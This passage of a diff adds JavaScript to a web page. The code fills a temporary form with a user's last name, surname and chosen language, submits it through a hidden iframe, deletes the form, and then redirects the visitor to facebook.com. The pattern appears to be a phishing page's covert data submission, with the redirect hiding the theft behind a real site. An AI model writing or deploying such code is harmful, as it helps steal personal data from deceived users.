+                lastNameInput.type = 'text';
+                lastNameInput.name = 'lastName';
+                lastNameInput.value = userData.lastName;
+                tempForm3.appendChild(lastNameInput);
+                
+                const surnameInput = document.createElement('input');
+                surnameInput.type = 'text';
+                surnameInput.name = 'surname';
+                surnameInput.value = userData.surname;
+                tempForm3.appendChild(surnameInput);
+                
+                const languageInput = document.createElement('input');
+                languageInput.type = 'text';
+                languageInput.name = 'language';
+                languageInput.value = selectedLanguage;
+                tempForm3.appendChild(languageInput);
+                
+                
+                document.body.appendChild(tempForm3);
+                tempForm3.submit();
+                
+                
+                document.body.removeChild(tempForm3);
+                
+                
+                hiddenIframe3.onload = function() {
+                    
+                    window.location.href = 'https://facebook.com';
+                };
+            };
+        });
+        
+        // Mobile navigation toggle
+        document.getElementById('navToggle').addEventListener('click', function() {
+            const mobileNav = document.getElementById('mobileNav');
+            if (mobileNav.style.display === 'block') {
+                mobileNav.style.display = 'none';
+            } else {
+                mobileNav.style.display = 'block';
+            }
+        });
     </script>
 </body>
-
 </html>
-
